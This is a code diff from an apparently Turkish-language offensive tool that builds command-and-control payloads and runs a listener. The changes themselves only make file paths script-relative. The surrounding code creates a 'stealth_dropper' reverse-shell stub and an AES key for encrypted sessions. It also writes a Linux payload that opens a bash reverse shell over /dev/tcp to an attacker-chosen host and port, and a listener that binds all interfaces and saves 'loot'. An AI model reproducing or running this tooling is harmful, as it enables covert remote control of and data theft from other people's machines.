@@ -335,11 +335,11 @@ def c2_payload_builder(auto_lhost=None, auto_lport=None, auto_os=None, auto_anti
             sys.stdout.flush()
             
             aes_key = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
-            save_text("c2_aes_key.txt", aes_key)
+            save_text(os.path.join(os.path.dirname(os.path.abspath(__file__)), "c2_aes_key.txt"), aes_key)
             print(f"{C.GREEN}  [+] AES-256 Anahtarı Üretildi ve Kaydedildi.{C.RESET}")
 
             # Reverse shell Python scripti oluştur
-            output_dir = "stealth_dropper"
+            output_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "stealth_dropper")
             os.makedirs(output_dir, exist_ok=True)
             stub_path = os.path.join(output_dir, "_stub.py")
 
@@ -467,7 +467,7 @@ except:
 
     elif os_choice == '2':
         payload = f"#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
-        save_text("linux_payload.sh", payload)
+        save_text(os.path.join(os.path.dirname(os.path.abspath(__file__)), "linux_payload.sh"), payload)
         print(f"\n{C.GREEN}[+] Linux Payload oluşturuldu: linux_payload.sh{C.RESET}")
     
     if not auto_exename:
@@ -487,15 +487,16 @@ def c2_listener():
 
     # AES Key Yükle
     aes_key = None
-    if os.path.exists("c2_aes_key.txt"):
-        with open("c2_aes_key.txt", "r") as f:
+    key_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "c2_aes_key.txt")
+    if os.path.exists(key_path):
+        with open(key_path, "r") as f:
             aes_key = f.read().strip().encode('utf-8')
         print(f"{C.GREEN}  [+] Mevcut AES-256 Anahtarı yüklendi.{C.RESET}")
     else:
         print(f"{C.YELLOW}  [!] Uyarı: AES-256 Anahtarı bulunamadı! (c2_aes_key.txt yok){C.RESET}")
         print(f"{C.DIM}      Şifresiz (Plaintext) payload bağlantısı beklenecek.{C.RESET}")
 
-    loot_dir = "loot"
+    loot_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")
     os.makedirs(loot_dir, exist_ok=True)
 
     print(f"\n{C.GREEN}  [*] 0.0.0.0:{port} dinleniyor... (İptal: CTRL+C){C.RESET}")
